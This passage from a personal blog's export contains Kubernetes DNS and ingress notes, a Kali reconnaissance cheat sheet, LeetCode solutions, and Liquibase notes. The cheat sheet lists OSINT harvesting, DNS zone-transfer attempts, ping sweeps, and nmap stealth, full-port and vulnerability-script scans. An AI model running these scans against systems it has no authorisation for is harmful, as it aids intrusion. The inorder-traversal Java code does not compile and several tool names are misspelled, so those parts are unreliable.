<h3 id="kubedns"><a href="#kubedns" class="headerlink" title="kubedns"></a>kubedns</h3><p>kubedns: kubedns 基于 SkyDNS 库，通过 apiserver 监听 Service 和 Endpoints 的变更事件同时也同步到本地 Cache，实现了一个实时的 Kubernetes 集群内 Service 和 Pod 的 DNS服务发现<br>dnsmasq: dsnmasq 容器则实现了 DNS 的缓存功能(在内存中预留一块默认大小为 1G 的地方，保存当前最常用的 DNS 查询记录，如果缓存中没有要查找的记录，它会到 kubedns 中查询，并把结果缓存起来)，通过监听 ConfigMap 来动态生成配置<br>sider: sidecar 容器实现了可配置的 DNS 探测，并采集对应的监控指标暴露出来供 prometheus 使用</p>
<h3 id="ingress"><a href="#ingress" class="headerlink" title="ingress"></a>ingress</h3><p>Ingress其实就是从 kuberenets 集群外部访问集群的一个入口，将外部的请求转发到集群内不同的 Service 上，其实就相当于 nginx、haproxy 等负载均衡代理服务器</p>
<p>Ingress controller 可以理解为一个监听器，通过不断地与 kube-apiserver 打交道，实时的感知后端 service、pod 的变化，当得到这些变化信息后，Ingress controller 再结合 Ingress 的配置，更新反向代理负载均衡器，达到服务发现的作用。其实这点和服务发现工具 consul consul-template 非常类似。</p>
]]></content>
      <categories>
        <category>容器</category>
      </categories>
      <tags>
        <tag>Deployment</tag>
        <tag>K8s</tag>
      </tags>
  </entry>
  <entry>
    <title>kali command note</title>
    <url>/2017/01/24/kalicommandnote/</url>
    <content><![CDATA[<ol>
<li><p><code>lsof -i</code> 用以显示符合条件的进程情况，<code>lsof(list open files)</code>是一个列出当前系统打开文件的工具。以<code>root</code>用户来执行<code>lsof -i</code></p>
</li>
<li><p>lsof -i:端口号，用于查看某一端口的占用情况，比如查看22号端口使用情况，lsof -i:22</p>
</li>
<li><p>切换 root用户 su root</p>
</li>
<li><p>netstat -tunlp 用于显示tcp，udp的端口和进程等相关情况，如图<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170124223214655?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="这里写图片描述"
                ></p>
</li>
<li><ul>
<li>ifconfig -a 以列表形式列出所有可用接口</li>
<li>ifconfig eth0 up 激活第一（0）个网络设备（网卡）</li>
<li>ifconfig eth0 up 192.168.1.23 为第一个设备分配IP</li>
<li>dhclient 自动配置</li>
</ul>
</li>
<li><p>网站复制机<br>httrack 输入运行即可<br>提供至少两个参数 projectName &amp; aimUrl</p>
</li>
<li><p>cache 搜索引擎技巧<br>显示快照 cache:edu.+++.com</p>
</li>
<li><p>locate theharvester<br>.&#x2F;thehaverster.py -d kula.com -l 10 -b google<br>-l 限定搜索结果数目<br>-b 指定公有知识库，可填all<br>-d url</p>
</li>
<li><p>whois url<br>特别留意dns服务器<br>如果dns服务器只列出名字，可用host翻译成IP</p>
</li>
<li><p>host 可互译IP与域名<br>建议添加 -a 以便列出额外信息</p>
</li>
<li><p>man 查看工具命令<br>man tool_name 显示关于命令的更多信息</p>
</li>
<li><p>Nslookup</p>
<blockquote>
<p>server DNS_IP<br>set type &#x3D; any(mx为IP)</p>
</blockquote>
</li>
<li><p>DIG<br>dig @target_IP (加参数)-t AXRF</p>
</li>
<li><p>当区域传输（dig）失败之后<br>考虑使用fierce<br>.&#x2F;fiercer.pl -dns domain</p>
</li>
<li><p>MetaGooFill<br>.&#x2F;metagoofil.py -d domain -t fileTypeSplit, -n number -o dir -f index.html</p>
</li>
<li><p>ThreatAgent Drone<br>信息收集工具</p>
</li>
<li><p>scan</p>
</li>
</ol>
<div class="code-container" data-rel="Markdown"><figure class="iseeu highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">1.</span> ping 与 ping 扫描  </span><br><span class="line"><span class="code">    fping 工具用来批量化扫描  </span></span><br><span class="line"><span class="code">    fping -a -g 172.16.45.1 172.16.45.254 &gt; host.txt  </span></span><br><span class="line"><span class="code">    -a 输出只显示活动主机  </span></span><br><span class="line"><span class="code">    -g 指定范围  </span></span><br><span class="line"><span class="code">    `&gt; host.txt` 写出到文件</span></span><br><span class="line"><span class="code">2. TCP连接扫描  </span></span><br><span class="line"><span class="code">    nmap -sT -p- -Pn IP1-IP2  </span></span><br><span class="line"><span class="code">    -s 扫描类型  </span></span><br><span class="line"><span class="code">    T TCP ； S SYN； U UDP ； V Version； X Xmas； N Null； O Os  </span></span><br><span class="line"><span class="code">    -p- 扫描所有端口  </span></span><br><span class="line"><span class="code">    -Pn 跳过主机发现阶段，对所有地址进行扫描  </span></span><br><span class="line"><span class="code">    范围IP1连续到IP2  </span></span><br><span class="line"><span class="code">    不连续可使用文件方法-iL File  </span></span><br><span class="line"><span class="code">    tips：  </span></span><br><span class="line"><span class="code">    Xmas 和Null扫描利用的是RFC文档  </span></span><br><span class="line"><span class="code">    即当没有将SYN，ACK，RST标记（Xmas即为此种数据包）置位时，若端口开启，会忽略数据包，端口关闭，会返回响应。  </span></span><br><span class="line"><span class="code">    这两种适应于遵循RFC文档的系统，即linux和Unix系统。对windows系统并不感冒。  </span></span><br><span class="line"><span class="code">    多数情况下Null和Xmas扫描相反，因为发送包标记为空。</span></span><br><span class="line"><span class="code">    </span></span><br><span class="line"><span class="code">3. nmap –script script_name IP  </span></span><br><span class="line"><span class="code">    banner 创建一个TCP端口，将目标系统的所有信息打印  </span></span><br><span class="line"><span class="code">    vuln 扫描漏洞的准备工作</span></span><br><span class="line"><span class="code">    </span></span><br><span class="line"><span class="code">4. 漏洞扫描  </span></span><br><span class="line"><span class="code">    nessus 的安装和使用</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.08.14</title>
    <url>/2020/08/14/leetcode/</url>
    <content><![CDATA[<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//Given a 2D binary matrix filled with 0&#x27;s and 1&#x27;s, find the largest square cont</span></span><br><span class="line"><span class="comment">//aining only 1&#x27;s and return its area. </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example: </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//Input: </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//1 0 1 0 0</span></span><br><span class="line"><span class="comment">//1 0 1 1 1</span></span><br><span class="line"><span class="comment">//1 1 1 1 1</span></span><br><span class="line"><span class="comment">//1 0 0 1 0</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Output: 4</span></span><br><span class="line"><span class="comment">// Related Topics Dynamic Programming </span></span><br><span class="line"><span class="comment">// 👍 3259 👎 80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//leetcode submit region begin(Prohibit modification and deletion)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximalSquare</span><span class="params">(<span class="type">char</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(matrix.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxSide</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[matrix.length + <span class="number">1</span>][matrix[<span class="number">0</span>].length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; dp.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; dp[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i-<span class="number">1</span>][j-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = Math.min(Math.min(dp[i-<span class="number">1</span>][j], dp[i][j-<span class="number">1</span>]), dp[i-<span class="number">1</span>][j-<span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                    maxSide = Math.max(maxSide, dp[i][j]);</span><br><span class="line">                    result = maxSide * maxSide;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//leetcode submit region end(Prohibit modification and deletion)</span></span><br></pre></td></tr></table></figure></div>

<p>可以看成一个特别大的正方形，然后扣掉左上角和右小角(当前 <code>arr[i][j]</code>)这样，其实决定的就是上，左，和上左所决定的三条线距离.</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/14/leetcode/221%5B0%5D.png"
                      class="" title="max-matrix"
                >


<hr>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Given a binary tree, return the inorder traversal of its nodes&#x27; values. </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example: </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//Input: [1,null,2,3]</span></span><br><span class="line"><span class="comment">//   1</span></span><br><span class="line"><span class="comment">//    \</span></span><br><span class="line"><span class="comment">//     2</span></span><br><span class="line"><span class="comment">//    /</span></span><br><span class="line"><span class="comment">//   3</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Output: [1,3,2] </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Follow up: Recursive solution is trivial, could you do it iteratively? </span></span><br><span class="line"><span class="comment">// Related Topics Hash Table Stack Tree </span></span><br><span class="line"><span class="comment">// 👍 3343 👎 140</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        pushLeftUntilNull(cur, stack);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            list.add(cur.val);</span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                cur = cur.right;</span><br><span class="line">                pushLeftUntilNull(cur, stack);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">pushLeftUntilNull</span><span class="params">(TreeNode root, Stack&lt;Integer&gt; s)</span>&#123;</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span>(root.left != <span class="literal">null</span>) &#123;</span><br><span class="line">            s.push(root.left);</span><br><span class="line">            root = root.left;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>节点全部都是入栈的,只不过每次都是入左臂所有节点, 综合起来就可以看成这样</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/08/14/leetcode/94%5B0%5D.jpg"
                      class="" title="inorder-traversal"
                >

<p>其实左臂就已包含所有节点，不要片面的去考虑分支的方向，点就在那里，任凭你左链右链，它不增不减</p>
<hr>
<p>Since 10^{i}$ \equiv 1（mod 9) ,then &#x3D;&gt;<br>(a_{i}$ * 10^{i}$ + a_{i-1}$ * 10^{i-1}$ + …) mod 9 &#x3D; (a_{i}$ * 10^{i}$ mod 9 + a_{i-1}$ * 10^{i-1}$ mod 9 + …) mod 9<br>&#x3D; (a_{i}$ + a_{i-1}$ + …) mod 9</p>
<p><a class="link"   href="https://leetcode.com/problems/add-digits/discuss/68580/Accepted-C%2B%2B-O(1)-time-O(1)-space-1-Line-Solution-with-Detail-Explanations" >https://leetcode.com/problems/add-digits/discuss/68580/Accepted-C%2B%2B-O(1)-time-O(1)-space-1-Line-Solution-with-Detail-Explanations<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<blockquote>
<p><a class="link"   href="https://en.wikipedia.org/wiki/Digital_root#Congruence_formula" >https://en.wikipedia.org/wiki/Digital_root#Congruence_formula<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>For base b (decimal case b &#x3D; 10), the digit root of an integer is:</p>
<ul>
<li>dr(n) &#x3D; 0 if n &#x3D;&#x3D; 0</li>
<li>dr(n) &#x3D; (b-1) if n !&#x3D; 0 and n % (b-1) &#x3D;&#x3D; 0</li>
<li>dr(n) &#x3D; n mod (b-1) if n % (b-1) !&#x3D; 0</li>
</ul>
<p>or</p>
<ul>
<li>dr(n) &#x3D; 1 + (n - 1) % 9</li>
</ul>
<p>Note here, when n &#x3D; 0, since (n - 1) % 9 &#x3D; -1, the return value is zero (correct).</p>
<p>From the formula, we can find that the result of this problem is immanently periodic, with period (b-1).</p>
<p>Output sequence for decimals (b &#x3D; 10):</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">~input: 0 1 2 3 4 ...</span><br><span class="line">output: 0 1 2 3 4 5 6 7 8 9 1 2 3 4 5 6 7 8 9 1 2 3 ....</span><br></pre></td></tr></table></figure></div>

<p>Henceforth, we can write the following code, whose time and space complexities are both O(1).</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">addDigits</span><span class="params">(<span class="type">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + (num - <span class="number">1</span>) % <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<hr>
<blockquote>
<p><strong>Input: 00000010100101000001111010011100</strong></p>
</blockquote>
<blockquote>
<p><strong>Output: 00111001011110000010100101000000</strong></p>
</blockquote>
<blockquote>
<p><strong>Explanation: The input binary string 00000010100101000001111010011100 represents the unsigned integer 43261596, so return 964176192 which its binary representation is 00111001011110000010100101000000.</strong></p>
</blockquote>
<p><a class="link"   href="https://leetcode.com/problems/reverse-bits/discuss/54741/O(1)-bit-operation-C%2B%2B-solution-(8ms)" >https://leetcode.com/problems/reverse-bits/discuss/54741/O(1)-bit-operation-C%2B%2B-solution-(8ms)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">uint32_t</span> <span class="title">reverseBits</span><span class="params">(<span class="type">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        n = (n &gt;&gt; <span class="number">16</span>) | (n &lt;&lt; <span class="number">16</span>);  <span class="comment">// swap the suffix 16 bits and prefix 16 bits position              </span></span><br><span class="line">        n = ((n &amp; <span class="number">0xff00ff00</span>) &gt;&gt; <span class="number">8</span>) | ((n &amp; <span class="number">0x00ff00ff</span>) &lt;&lt; <span class="number">8</span>); <span class="comment">// go head but minimal the size  </span></span><br><span class="line">        n = ((n &amp; <span class="number">0xf0f0f0f0</span>) &gt;&gt; <span class="number">4</span>) | ((n &amp; <span class="number">0x0f0f0f0f</span>) &lt;&lt; <span class="number">4</span>);                                </span><br><span class="line">        n = ((n &amp; <span class="number">0xcccccccc</span>) &gt;&gt; <span class="number">2</span>) | ((n &amp; <span class="number">0x33333333</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">        n = ((n &amp; <span class="number">0xaaaaaaaa</span>) &gt;&gt; <span class="number">1</span>) | ((n &amp; <span class="number">0x55555555</span>) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>Explanation:<br>&#x2F;&#x2F; 12345678<br>&#x2F;&#x2F; 56781234<br>&#x2F;&#x2F; 78563412<br>&#x2F;&#x2F; 87654321</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>liquibase</title>
    <url>/2019/08/21/liquibase/</url>
    <content><![CDATA[<ol>
<li><p>As Liquibase executes the databaseChangeLog, it reads the changeSets <strong>in order</strong> and, for each one, checks the “databasechangelog” table to see if the combination of id&#x2F;author&#x2F;filepath has been run. If it has been run, the changeSet will be skipped unless there is a true <code>“runAlways”</code> tag. After all the changes in the changeSet are run, Liquibase will insert a new row with the id&#x2F;author&#x2F;filepath along with an MD5Sum of the changeSet (see below) in the “databasechangelog”.</p>
</li>
<li><p>Liquibase attempts to execute each changeSet in a transaction that is committed at the end, or rolled back if there is an error. Some databases will auto-commit statements which interferes with this transaction setup and could lead to an unexpected database state. Therefore, it is usually best to have just one change per changeSet unless there is a group of non-auto-committing changes that you want applied as a transaction such as inserting data.</p>
</li>
<li><p>When Liquibase reaches a changeSet, it computes a check sum and stores it in the “databasechangelog”. The value of storing the check sum is so that Liquibase can know if someone changed the changes in the changeSet since it was run. If the changeSet was changed since it was run, Liquibase will exit the migration with an error because it cannot know what was changed and the database may be in a state different than what the changeLog is expecting. If there was a valid reason for the changeSet to have been changed and you want to ignore this error, update the databasechangelog table so that the row with the corresponding id&#x2F;author&#x2F;filepath has a null value for the check sum. The next time Liquibase runs, it will update the check sum value to the new correct value.</p>
</li>
<li><p>Check sums are also used in conjunction with the “runOnChange” changeSet attribute. There are times you may not want to add a new changeSet because you only need to know about the current version, but you want this change applied whenever it is updated. A good example of when you would want this is stored procedures. If you copy the entire text of the stored procedure to a new changeSet each time you make a change you will not only end up with a very long changeLog, but you will lose the merging and diff-ing power of your source control. Instead, put the text of the stored procedure in a changeSet with a runOnChange&#x3D;”true” attribute. The stored procedure will only be re-created when and only when there is a change to the text of it.</p>
</li>
<li><p>Do not use key word</p>
</li>
</ol>
<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;AUDIT&quot;, &quot;VOLUMES&quot;, &quot;MINVALUE&quot;, &quot;STATIC&quot;, &quot;FLOOR&quot;, &quot;CATALOG&quot;, &quot;YEAR&quot;, &quot;TRIGGER_CATALOG&quot;, &quot;WLM&quot;,</span><br><span class="line">            &quot;DISCONNECT&quot;, &quot;PARTITION&quot;, &quot;LEFT&quot;, &quot; MODE&quot;, &quot;SEARCH&quot;, &quot;CURRENT_PATH&quot;, &quot;DAYOFYEAR&quot;, &quot;SIZE&quot;, &quot;RESTRICT&quot;, &quot;RELEASE&quot;,</span><br><span class="line">            &quot;WHERE&quot;, &quot;POSTFIX&quot;, &quot;SQLWARNING&quot;, &quot;UID&quot;, &quot;AS&quot;, &quot;AT&quot;, &quot;SYSID&quot;, &quot;DATABASE&quot;, &quot;SPECIFIC_NAME&quot;, &quot;TIMEZONE_MINUTE&quot;,</span><br><span class="line">            &quot;LC_CTYPE&quot;, &quot;ATTRIBUTES&quot;, &quot;LOCATION&quot;, &quot;A&quot;, &quot;DOMAIN&quot;, &quot;C&quot;, &quot;SET&quot;, &quot; INCREMENT&quot;, &quot;MERGE&quot;, &quot;G&quot;, &quot;DAYS&quot;, &quot;HEADER&quot;,</span><br><span class="line">            &quot;K&quot;, &quot;CONSTRAINT&quot;, &quot;M&quot;, &quot;PRECISION&quot;, &quot;ROLE&quot;, &quot;COLLATION_NAME&quot;, &quot;BY&quot;, &quot;STRAIGHT_JOIN&quot;, &quot;CHARACTER&quot;, &quot;INSTEAD&quot;,</span><br><span class="line">            &quot;DUAL&quot;, &quot;DSNHATTR&quot;, &quot;BERNOULLI&quot;, &quot; ADD&quot;, &quot;CLUSTERED&quot;, &quot;CONTINUE&quot;, &quot;DIV&quot;, &quot;OPERATOR&quot;, &quot;SETS&quot;, &quot;SECURITY&quot;,</span><br><span class="line">            &quot;CURRENT_LC_CTYPE&quot;, &quot;TRUNCATE&quot;, &quot;CURSOR&quot;, &quot;SQL_LOW_PRIORITY_UPDATES&quot;, &quot;CONSTRAINT_SCHEMA&quot;, &quot;STATEMENT&quot;,</span><br><span class="line">            &quot;TABLE_NAME&quot;, &quot;NODENUMBER&quot;, &quot;DO&quot;, &quot;RECOVERY&quot;, &quot;LOW_PRIORITY&quot;, &quot;ADMIN&quot;, &quot;ESCAPED&quot;, &quot;CAPTURE&quot;, &quot;ALLOW&quot;, &quot;VARYING&quot;,</span><br><span class="line">            &quot;DISABLE&quot;, &quot;STRICT&quot;, &quot;SQL_BIG_RESULT&quot;, &quot;ABORT&quot;, &quot;FOR&quot;, &quot;IMPLICIT&quot;, &quot;USING&quot;, &quot;EXEC&quot;, &quot;DEFERRABLE&quot;, &quot;RAISERROR&quot;,</span><br><span class="line">            &quot;USER_DEFINED_TYPE_NAME&quot;, &quot;VALIDATOR&quot;, &quot;UNDO&quot;, &quot;STATE&quot;, &quot;WITHIN&quot;, &quot;NCHAR&quot;, &quot;ABSOLUTE&quot;, &quot;PREORDER&quot;, &quot;SCHEMA&quot;,</span><br><span class="line">            &quot;SEQUENCE&quot;, &quot;ASSIGNMENT&quot;, &quot;COLUMNS&quot;, &quot;END-EXEC1&quot;, &quot;GO&quot;, &quot;ROW_NUMBER&quot;, &quot;BIT&quot;, &quot;INTERSECT&quot;, &quot;SYSDATE&quot;, &quot;WITH&quot;,</span><br><span class="line">            &quot;CLASS_ORIGIN&quot;, &quot;ACTION&quot;, &quot;ISNULL&quot;, &quot;VALIDATE&quot;, &quot; COMPRESS&quot;, &quot;START&quot;, &quot;CHARACTER_LENGTH&quot;, &quot;BULK&quot;, &quot;EVERY&quot;,</span><br><span class="line">            &quot;NULLIF&quot;, &quot;CEIL&quot;, &quot;FLUSH&quot;, &quot;MIN_ROWS&quot;, &quot;GRANTED&quot;, &quot;IF&quot;, &quot;BIT_LENGTH&quot;, &quot;PARAMETER&quot;, &quot;CHARACTER_SET_SCHEMA&quot;,</span><br><span class="line">            &quot;DEFINITION&quot;, &quot;NCLOB&quot;, &quot;FIELDS&quot;, &quot;IN&quot;, &quot;DISTINCT&quot;, &quot;STYLE&quot;, &quot;IS&quot;, &quot;MASTER_BIND&quot;, &quot;REGR_INTERCEPT&quot;, &quot;TERMINATE&quot;,</span><br><span class="line">            &quot;FORCE&quot;, &quot;FENCED&quot;, &quot; IMMEDIATE&quot;, &quot;MAP&quot;, &quot;READTEXT&quot;, &quot;SYSFUN&quot;, &quot;EXIT&quot;, &quot;DBCC&quot;, &quot;OPENROWSET&quot;, &quot;COLLATION&quot;, &quot;GOTO&quot;,</span><br><span class="line">            &quot;RAID0&quot;, &quot;MAX&quot;, &quot;CASCADE&quot;, &quot;DELIMITERS&quot;, &quot;TRANSACTION&quot;, &quot;SECQTY&quot;, &quot;IGNORE&quot;, &quot;COMMENT&quot;, &quot;OFF&quot;, &quot;CHARACTERS&quot;,</span><br><span class="line">            &quot;IDENTITYCOL&quot;, &quot;USAGE&quot;, &quot;UPDATE&quot;, &quot;SAVE&quot;, &quot;REQUIRE&quot;, &quot;DISTINCTROW&quot;, &quot;USE&quot;, &quot;RETURNS&quot;, &quot;LOCATORS&quot;,</span><br><span class="line">            &quot;CHARACTERISTICS&quot;, &quot;FIRST&quot;, &quot;LINENO&quot;, &quot;ONLINE&quot;, &quot;SELECT&quot;, &quot;EXCLUDING&quot;, &quot;TABLES&quot;, &quot;OUTFILE&quot;, &quot;ERASE&quot;, &quot;GREATEST&quot;,</span><br><span class="line">            &quot;UTC_DATE&quot;, &quot;VARCHARACTER&quot;, &quot;INVOKER&quot;, &quot;STOGROUP&quot;, &quot;DEPTH&quot;, &quot;CURRENT_USER&quot;, &quot;LN&quot;, &quot;ARRAY&quot;, &quot;ATOMIC&quot;, &quot; ALTER&quot;,</span><br><span class="line">            &quot;COLUMN_NAME&quot;, &quot;COLUMN&quot;, &quot;MODE&quot;, &quot; COMMENT&quot;, &quot;DECIMAL&quot;, &quot;RESET&quot;, &quot;NEW_TABLE&quot;, &quot;ROUTINE_NAME&quot;, &quot;COMPRESS&quot;,</span><br><span class="line">            &quot;OVERLAY&quot;, &quot;READ_WRITE&quot;, &quot;COALESCE&quot;, &quot;STATUS&quot;, &quot; EXCLUSIVE&quot;, &quot;UNBOUNDED&quot;, &quot;REGR_SLOPE&quot;, &quot;CORRESPONDING&quot;,</span><br><span class="line">            &quot;TIMESTAMP&quot;, &quot;MESSAGE_OCTET_LENGTH&quot;, &quot;SQL_LOG_OFF&quot;, &quot;RETURNED_LENGTH&quot;, &quot;DISALLOW&quot;, &quot;PRIVILEGES&quot;, &quot;SQL&quot;, &quot;READ&quot;,</span><br><span class="line">            &quot; IDENTIFIED&quot;, &quot;REAL&quot;, &quot;LESS&quot;, &quot;DIAGNOSTICS&quot;, &quot;QUERYNO&quot;, &quot;NO&quot;, &quot;FLOAT&quot;, &quot;COMMAND_FUNCTION_CODE&quot;,</span><br><span class="line">            &quot;CURRENT_TIMESTAMP&quot;, &quot;TIES&quot;, &quot;ROUTINE&quot;, &quot;SUBLIST&quot;, &quot;FOLLOWING&quot;, &quot;ROLLBACK&quot;, &quot;MEMBER&quot;, &quot;DSSIZE&quot;, &quot;DUMP&quot;,</span><br><span class="line">            &quot;EXTERNAL&quot;, &quot;GROUPING&quot;, &quot;OF&quot;, &quot;CHANGE&quot;, &quot;RECHECK&quot;, &quot; NUMBER&quot;, &quot;ON&quot;, &quot;DBINFO&quot;, &quot;OR&quot;, &quot;EQUALS&quot;, &quot;CREATEROLE&quot;,</span><br><span class="line">            &quot;PRIMARY&quot;, &quot;SSL&quot;, &quot;MATCHED&quot;, &quot;DAYOFWEEK&quot;, &quot;DYNAMIC_FUNCTION_CODE&quot;, &quot;ENCODING&quot;, &quot;OPTIMIZATION&quot;, &quot;SECOND&quot;,</span><br><span class="line">            &quot;UNKNOWN&quot;, &quot;HOUR_SECOND&quot;, &quot;REFERENCES&quot;, &quot;ROWS&quot;, &quot;JAVA&quot;, &quot;SPATIAL&quot;, &quot;INHERIT&quot;, &quot;CREATE&quot;,</span><br><span class="line">            &quot;PARAMETER_SPECIFIC_SCHEMA&quot;, &quot;LEAST&quot;, &quot;OLD&quot;, &quot;TRIGGER&quot;, &quot;BETWEEN&quot;, &quot;OBID&quot;, &quot;CONVERT&quot;, &quot;POSITION&quot;, &quot;PROCESS&quot;,</span><br><span class="line">            &quot;SQL_SELECT_LIMIT&quot;, &quot;NOTHING&quot;, &quot;DEALLOCATE&quot;, &quot;SUBPAGES&quot;, &quot;INNER&quot;, &quot;SQL_BIG_SELECTS&quot;, &quot;EACH&quot;, &quot;OPTIONALLY&quot;,</span><br><span class="line">            &quot;SETUSER&quot;, &quot;BIGINT&quot;, &quot;NOAUDIT&quot;, &quot;SUM&quot;, &quot;OPTIONS&quot;, &quot;MIN&quot;, &quot;BITVAR&quot;, &quot;VARCHAR&quot;, &quot;SQLCA&quot;, &quot;KEY&quot;, &quot;PROGRAM&quot;, &quot;CALL&quot;,</span><br><span class="line">            &quot;WAITFOR&quot;, &quot;RELOAD&quot;, &quot;DELAY_KEY_WRITE&quot;, &quot;USER_DEFINED_TYPE_SCHEMA&quot;, &quot;RLIKE&quot;, &quot;EDITPROC&quot;, &quot;GROUP&quot;,</span><br><span class="line">            &quot;DATETIME_INTERVAL_PRECISION&quot;, &quot;ASSOCIATE&quot;, &quot;RESTORE&quot;, &quot;OFFSET&quot;, 